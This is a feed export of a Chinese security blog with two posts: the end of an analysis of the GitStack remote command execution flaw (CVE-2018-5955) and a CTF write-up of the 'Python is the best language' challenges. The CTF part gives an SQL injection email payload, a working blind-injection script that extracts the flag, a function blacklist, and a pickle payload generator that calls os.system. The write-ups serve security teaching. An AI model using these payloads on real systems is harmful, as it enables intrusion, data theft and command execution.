	$authenticated = <span class="keyword">false</span>;</div><div class="line">		<span class="comment">// Will contains username as key, salt and encrypted pass as value</span></div><div class="line">		$userInfos = <span class="keyword">Array</span>();</div><div class="line">		<span class="comment">// exec the open ssl command</span></div><div class="line">		$installDir = GitPHP_Config::GetInstance()-&gt;GetValue(<span class="string">'gitstackinstalldir'</span>, <span class="string">''</span>);	</div><div class="line">		$lines = file($installDir . <span class="string">"/data/passwdfile"</span>);</div><div class="line">		<span class="comment">// Fill the userInfos array</span></div><div class="line">		<span class="keyword">foreach</span>($lines <span class="keyword">as</span> $line)</div><div class="line">		&#123;</div><div class="line">			。。。省略	</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		<span class="comment">// if the user exist in the array</span></div><div class="line">		<span class="keyword">if</span>(array_key_exists($username, $userInfos))&#123;</div><div class="line">			<span class="comment">// run the openssl command to verify the password</span></div><div class="line">			$currentUser = $userInfos[$username];</div><div class="line">			$result = exec($installDir . <span class="string">'/apache/bin/openssl.exe passwd -apr1 -salt '</span> . $currentUser[<span class="string">'salt'</span>] . <span class="string">" "</span> . $password);</div><div class="line">			<span class="comment">// result = $apr1$v1Ds2Lf9$hNL6r81eGFXrUmh5wbQpn0</span></div><div class="line">			<span class="comment">// split the result to get only the encrypted password part</span></div><div class="line">			$split = explode(<span class="string">'$'</span>, $result);</div><div class="line">			$encryptedPassword = $split[<span class="number">3</span>];</div><div class="line">			<span class="keyword">if</span>($encryptedPassword == $currentUser[<span class="string">'encryptedPass'</span>])</div><div class="line">				$authenticated = <span class="keyword">true</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> $authenticated;	</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>此处的流程就是将project的用户信息从<code>/data/passwdfile</code>读出，经过一定的处理，然后通过openssl来进行响应的验证。注意这里的代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$result = exec($installDir . <span class="string">'/apache/bin/openssl.exe passwd -apr1 -salt '</span> . $currentUser[<span class="string">'salt'</span>] . <span class="string">" "</span> . $password);</div></pre></td></tr></table></figure></p>
<p>我们传入的<code>$password</code>直接拼接到了语句中，然后exec执行，这里即存在命令执行漏洞，且由于并不需要认证成功。</p>
<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>不过这里的任意命令执行漏洞有一些限制，它需要在进行<code>HTTP Basic Authentication</code>时在用户名处填入project的用户列表中的某一个，然后通过在密码处注入payload，才能到达<code>exec</code>处。因此结合前面第一部分的未授权访问/任意添加用户等等漏洞，可以梳理如下两种方法：</p>
<ol>
<li><p>通过<code>GET /rest/user</code>获取到所有的用户列表，然后直接进行爆破，总有某些用户是属于选择的project的用户列表中的。脚本如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180330/12.jpg?raw=true" alt=""></p>
</li>
<li><p>通过<code>POST /rest/user</code>添加用户x，接着创建repo，将用户x加入到repo中，然后基于用户x的认证来进行rce。第二种方法的脚本见 <a href="https://blogs.securiteam.com/index.php/archives/3557" target="_blank" rel="external">https://blogs.securiteam.com/index.php/archives/3557</a> ，不搬运了。</p>
</li>
</ol>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="https://blogs.securiteam.com/index.php/archives/3557" target="_blank" rel="external">SSD Advisory – GitStack Unauthenticated Remote Code Execution</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2235&quot;&gt;GitStack &amp;lt;= 2.3.10 远程命令执行漏洞分析-【CVE-2018-5955】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="gitstack" scheme="http://chybeta.github.io/tags/gitstack/"/>
    
  </entry>
  
  <entry>
    <title>Python is the best language-writeup</title>
    <link href="http://chybeta.github.io/2018/03/25/Python-is-the-best-language-writeup/"/>
    <id>http://chybeta.github.io/2018/03/25/Python-is-the-best-language-writeup/</id>
    <published>2018-03-25T11:07:59.000Z</published>
    <updated>2018-03-26T10:07:03.810Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xianzhi.aliyun.com/forum/topic/2219" target="_blank" rel="external">强网杯：Python is the best language-writeup</a><br><a id="more"></a></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>Python is the best language 1/2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">http://39.107.32.29:20000</div><div class="line"></div><div class="line">http://117.50.16.51:20000</div><div class="line"></div><div class="line">下载地址</div><div class="line">备用下载地址（密码：rtou）</div><div class="line"></div><div class="line">I&apos;m learning the flask recently,and I think python is the best language in the world!don&apos;t you think so?</div></pre></td></tr></table></figure></p>
<h1 id="Python-is-the-best-language-1"><a href="#Python-is-the-best-language-1" class="headerlink" title="Python is the best language 1"></a>Python is the best language 1</h1><p>源码下载下来后，由于是基于flask框架，因此先看了看路由文件<code>routes.py</code>，大概如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.before_request</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.teardown_request</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">shutdown_session</span><span class="params">(exception=None)</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></div><div class="line"><span class="meta">@app.route('/index', methods=['GET', 'POST'])</span></div><div class="line"><span class="meta">@login_required</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/explore')</span></div><div class="line"><span class="meta">@login_required</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">explore</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/logout')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/register', methods=['GET', 'POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/user/&lt;username&gt;')</span></div><div class="line"><span class="meta">@login_required</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(username)</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/edit_profile', methods=['GET', 'POST'])</span></div><div class="line"><span class="meta">@login_required</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_profile</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/follow/&lt;username&gt;')</span></div><div class="line"><span class="meta">@login_required</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">follow</span><span class="params">(username)</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/unfollow/&lt;username&gt;')</span></div><div class="line"><span class="meta">@login_required</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">unfollow</span><span class="params">(username)</span>:</span></div></pre></td></tr></table></figure></p>
<p>这些功能大部分是基于登陆的，因此从注册和登陆相关的代码入手。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.route('/register', methods=['GET', 'POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> current_user.is_authenticated:</div><div class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</div><div class="line">    form = RegistrationForm()</div><div class="line">    <span class="keyword">if</span> form.validate_on_submit():</div><div class="line">        res = mysql.Add(<span class="string">"user"</span>, [<span class="string">"NULL"</span>, <span class="string">"'%s'"</span> % form.username.data, <span class="string">"'%s'"</span> % form.email.data,</div><div class="line">                                 <span class="string">"'%s'"</span> % generate_password_hash(form.password.data), <span class="string">"''"</span>, <span class="string">"'%s'"</span> % now()])</div><div class="line">        <span class="keyword">if</span> res == <span class="number">1</span>:</div><div class="line">            flash(<span class="string">'Congratulations, you are now a registered user!'</span>)</div><div class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</div><div class="line">    <span class="keyword">return</span> render_template(<span class="string">'register.html'</span>, title=<span class="string">'Register'</span>, form=form)</div></pre></td></tr></table></figure></p>
<p>跟进<code>RegistrationForm</code>，定义在 <code>forms.py</code>的第20行:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegistrationForm</span><span class="params">(FlaskForm)</span>:</span></div><div class="line">    username = StringField(<span class="string">'Username'</span>, validators=[DataRequired()])</div><div class="line">    email = StringField(<span class="string">'Email'</span>, validators=[DataRequired(), Email()])</div><div class="line">    password = PasswordField(<span class="string">'Password'</span>, validators=[DataRequired()])</div><div class="line">    password2 = PasswordField(</div><div class="line">        <span class="string">'Repeat Password'</span>, validators=[DataRequired(), EqualTo(<span class="string">'password'</span>)])</div><div class="line">    submit = SubmitField(<span class="string">'Register'</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_username</span><span class="params">(self, username)</span>:</span></div><div class="line">        <span class="keyword">if</span> re.match(<span class="string">"^[a-zA-Z0-9_]+$"</span>, username.data) == <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'username has invalid charactor!'</span>)</div><div class="line">        user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"username"</span>: <span class="string">"'%s'"</span> % username.data&#125;, [<span class="string">"id"</span>])</div><div class="line">        <span class="keyword">if</span> user != <span class="number">0</span>:</div><div class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different username.'</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_email</span><span class="params">(self, email)</span>:</span></div><div class="line">        user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"email"</span>:  <span class="string">"'%s'"</span> % email.data&#125;, [<span class="string">"id"</span>])</div><div class="line">        <span class="keyword">if</span> user != <span class="number">0</span>:</div><div class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different email address.'</span>)</div></pre></td></tr></table></figure></p>
<p>在这里可以很明显的看到两个验证函数有差别，<code>validate_username</code>在进行<code>mysql.One</code>前进行了正则匹配的过滤和审核，而<code>validate_email</code>仅仅通过<code>validators=[DataRequired(), Email()]</code>来匹配。</p>
<p><code>Email</code>定义在<code>wtforms.validators</code>中，相关源码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Email</span><span class="params">(Regexp)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">    Validates an email address. Note that this uses a very primitive regular</div><div class="line">    expression and should only be used in instances where you later verify by</div><div class="line">    other means, such as email activation or lookups.</div><div class="line">    :param message:</div><div class="line">        Error message to raise in case of a validation error.</div><div class="line">    """</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, message=None)</span>:</span></div><div class="line">        self.validate_hostname = HostnameValidation(</div><div class="line">            require_tld=<span class="keyword">True</span>,</div><div class="line">        )</div><div class="line">        super(Email, self).__init__(<span class="string">r'^.+@([^.@][^@]+)$'</span>, re.IGNORECASE, message)</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, form, field)</span>:</span></div><div class="line">        message = self.message</div><div class="line">        <span class="keyword">if</span> message <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            message = field.gettext(<span class="string">'Invalid email address.'</span>)</div><div class="line">        match = super(Email, self).__call__(form, field, message)</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.validate_hostname(match.group(<span class="number">1</span>)):</div><div class="line">            <span class="keyword">raise</span> ValidationError(message)</div></pre></td></tr></table></figure></p>
<p>其正则规则为<code>^.+@([^.@][^@]+)$</code>，也就是说对email而言，即使提交如<code>&#39;&quot;#a@q.com</code>包含单引号，双引号，注释符等敏感字符的形式也是能通过的。</p>
<p>回到<code>validate_email</code>验证函数中：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate_email</span><span class="params">(self, email)</span>:</span></div><div class="line">    user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"email"</span>:  <span class="string">"'%s'"</span> % email.data&#125;, [<span class="string">"id"</span>])</div><div class="line">    <span class="keyword">if</span> user != <span class="number">0</span>:</div><div class="line">        <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different email address.'</span>)</div></pre></td></tr></table></figure></p>
<p>跟入<code>mysql.One</code>，定义在others.py:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># mysql.One("user", &#123;"email":  "'%s'" % email.data&#125;, ["id"])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">One</span><span class="params">(self, tablename, where=&#123;&#125;, feildname=[<span class="string">"*"</span>], order=<span class="string">""</span>, where_symbols=<span class="string">"="</span>, l=<span class="string">"and"</span>)</span>:</span></div><div class="line">    <span class="comment"># self.Sel("user", &#123;"email":  "'%s'" % email.data&#125;, ["id"], "", "=", l)</span></div><div class="line">    sql = self.Sel(tablename, where, feildname, order, where_symbols, l)</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        res = self.db_session.execute(sql).fetchone()</div><div class="line">        <span class="keyword">if</span> res == <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        <span class="keyword">return</span> res</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span></div><div class="line">``` </div><div class="line"></div><div class="line">跟入`self.Sel`:</div><div class="line">```python</div><div class="line"><span class="comment"># self.Sel("user", &#123;"email":  "'%s'" % email.data&#125;, ["id"], "", "=", l)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sel</span><span class="params">(self, tablename, where=&#123;&#125;, feildname=[<span class="string">"*"</span>], order=<span class="string">""</span>, where_symbols=<span class="string">"="</span>, l=<span class="string">"and"</span>)</span>:</span></div><div class="line">    sql = <span class="string">"select "</span></div><div class="line">    sql += <span class="string">""</span>.join(i + <span class="string">","</span> <span class="keyword">for</span> i <span class="keyword">in</span> feildname)[:<span class="number">-1</span>] + <span class="string">" "</span></div><div class="line">    sql += <span class="string">"from "</span> + tablename + <span class="string">" "</span></div><div class="line">    <span class="keyword">if</span> where != &#123;&#125;:</div><div class="line">        sql += <span class="string">"where "</span> + <span class="string">""</span>.join(i + <span class="string">" "</span> + where_symbols + <span class="string">" "</span> +</div><div class="line">                                    str(where[i]) + <span class="string">" "</span> + l + <span class="string">" "</span> <span class="keyword">for</span> i <span class="keyword">in</span> where)[:<span class="number">-4</span>]</div><div class="line">    <span class="keyword">if</span> order != <span class="string">""</span>:</div><div class="line">        sql += <span class="string">"order by "</span> + <span class="string">""</span>.join(i + <span class="string">","</span> <span class="keyword">for</span> i <span class="keyword">in</span> order)[:<span class="number">-1</span>]</div><div class="line">    <span class="keyword">return</span> sql</div></pre></td></tr></table></figure></p>
<p>最后拼接出来的sql语句如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> email = <span class="string">'your input email'</span></div></pre></td></tr></table></figure></p>
<p>结合前面所说的对输入邮箱email形式的验证，这里存在sql注入漏洞。我们设置邮箱为<code>test&#39;/**/or/**/1=1#@test.com</code>，则拼接后的sql语句为：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> email = <span class="string">'test'</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span>#@test.com<span class="string">'</span></div></pre></td></tr></table></figure></p>
<p>可以看到成功注入。由于此处不能回显数据，因此采用盲注。回到<code>validate_username</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate_username</span><span class="params">(self, username)</span>:</span></div><div class="line">    <span class="keyword">if</span> re.match(<span class="string">"^[a-zA-Z0-9_]+$"</span>, username.data) == <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">raise</span> ValidationError(<span class="string">'username has invalid charactor!'</span>)</div><div class="line">    user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"username"</span>: <span class="string">"'%s'"</span> % username.data&#125;, [<span class="string">"id"</span>])</div><div class="line">    <span class="keyword">if</span> user != <span class="number">0</span>:</div><div class="line">        <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different username.'</span>)</div></pre></td></tr></table></figure></p>
<p>当查询为真时也即<code>user != 0</code>会出现信息<code>Please use a different username.</code>，结合这点构造出最后的exp.py：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"></div><div class="line">url = <span class="string">"http://39.107.32.29:20000/register"</span></div><div class="line"></div><div class="line">r = requests.get(url)</div><div class="line">soup = BeautifulSoup(r.text,<span class="string">"html5lib"</span>)</div><div class="line">token = soup.find_all(id=<span class="string">'csrf_token'</span>)[<span class="number">0</span>].get(<span class="string">"value"</span>)</div><div class="line"></div><div class="line">notice = <span class="string">"Please use a different email address."</span></div><div class="line">result = <span class="string">""</span></div><div class="line"></div><div class="line">database = <span class="string">"(SELECT/**/GROUP_CONCAT(schema_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)"</span></div><div class="line">tables = <span class="string">"(SELECT/**/GROUP_CONCAT(table_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE())"</span></div><div class="line">columns = <span class="string">"(SELECT/**/GROUP_CONCAT(column_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_NAME=0x666c616161616167)"</span></div><div class="line">data = <span class="string">"(SELECT/**/GROUP_CONCAT(flllllag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flaaaaag)"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</div><div class="line">        payload = <span class="string">"test'/**/or/**/ascii(substr("</span>+  data +<span class="string">",%d,1))=%d#/**/@chybeta.com"</span> % (i,j)</div><div class="line">        <span class="keyword">print</span> payload</div><div class="line">        post_data = &#123;</div><div class="line">            <span class="string">'csrf_token'</span>: token,</div><div class="line">            <span class="string">'username'</span>: <span class="string">'a'</span>,</div><div class="line">            <span class="string">'email'</span>:payload,</div><div class="line">            <span class="string">'password'</span>:<span class="string">'a'</span>,</div><div class="line">            <span class="string">'password2'</span>:<span class="string">'a'</span>,</div><div class="line">            <span class="string">'submit'</span>:<span class="string">'Register'</span></div><div class="line">        &#125;</div><div class="line">        r = requests.post(url,data=post_data)</div><div class="line">        soup = BeautifulSoup(r.text,<span class="string">"html5lib"</span>)</div><div class="line">        token = soup.find_all(id=<span class="string">'csrf_token'</span>)[<span class="number">0</span>].get(<span class="string">"value"</span>)</div><div class="line">        <span class="keyword">if</span> notice <span class="keyword">in</span> r.text:</div><div class="line">            result += chr(j)</div><div class="line">            <span class="keyword">print</span> result</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p>由于在注册部分有csrf_token，因此在每次submit时要记得带上，同时在每次返回的页面中取得下一次的csrf_token。</p>
<p>最后的flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">QWB&#123;us1ng_val1dator_caut1ous&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Python-is-the-best-language-2"><a href="#Python-is-the-best-language-2" class="headerlink" title="Python is the best language 2"></a>Python is the best language 2</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>接着进行代码审计。在<code>others.py</code>的最后有这样的内容：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">black_type_list = [eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen,</div><div class="line">                   tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link,</div><div class="line">                   lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs,</div><div class="line">                   rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv,</div><div class="line">                   execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe,</div><div class="line">                   spawnv, spawnve, spawnvp, spawnvpe, load, loads]</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FilterException</span><span class="params">(Exception)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, value)</span>:</span></div><div class="line">        super(FilterException, self).__init__(</div><div class="line">            <span class="string">'the callable object &#123;value&#125; is not allowed'</span>.format(value=str(value)))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hook_call</span><span class="params">(func)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">        <span class="keyword">print</span> args[<span class="number">0</span>].stack</div><div class="line">        <span class="keyword">if</span> args[<span class="number">0</span>].stack[<span class="number">-2</span>] <span class="keyword">in</span> black_type_list:</div><div class="line">            <span class="keyword">raise</span> FilterException(args[<span class="number">0</span>].stack[<span class="number">-2</span>])</div><div class="line">        <span class="keyword">return</span> func(*args, **kwargs)</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(file)</span>:</span></div><div class="line">    unpkler = Unpkler(file)</div><div class="line">    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])</div><div class="line">    <span class="keyword">return</span> Unpkler(file).load()</div></pre></td></tr></table></figure></p>
<p>我把这部分内容分为两部分；反序列化漏洞以及基本的沙箱逃逸问题。</p>
<p>先忽略<code>unpkler.dispatch[REDUCE]</code>这一行的内容。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Unpickler <span class="keyword">as</span> Unpkler</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(file)</span>:</span></div><div class="line">    unpkler = Unpkler(file)</div><div class="line">    <span class="comment"># unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])</span></div><div class="line">    <span class="keyword">return</span> Unpkler(file).load()</div></pre></td></tr></table></figure>
<p>这里对<code>file</code>进行了反序列化，因此如果<code>file</code>可控即可造成危险。</p>
<p>用下面的脚本(exp4.py)进行序列化payload的生成：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Pickler <span class="keyword">as</span> Pkler</div><div class="line"><span class="keyword">import</span> commands</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> (os.system,(<span class="string">"whoami"</span>,))    </div><div class="line">evil = chybeta()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(file)</span>:</span></div><div class="line">	pkler = Pkler(file)</div><div class="line">	pkler.dump(evil)</div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">"test"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</div><div class="line">	dump(f)</div></pre></td></tr></table></figure></p>
